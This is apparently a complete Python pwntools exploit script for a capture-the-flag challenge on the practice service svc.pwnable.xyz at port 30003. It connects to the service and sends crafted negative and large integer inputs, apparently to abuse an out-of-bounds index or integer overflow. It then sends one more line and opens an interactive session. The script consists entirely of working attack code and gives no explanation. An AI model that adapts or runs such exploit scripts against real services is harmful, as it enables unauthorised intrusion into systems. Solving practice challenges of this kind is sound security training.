from pwn import *

p = remote("svc.pwnable.xyz", 30003)
payload = "-5404319552844595200 0 -6"
p.sendline(payload)
payload = str(int(0xB000000)) + " 0 -5"
p.sendline(payload)
p.sendline("A")
p.interactive()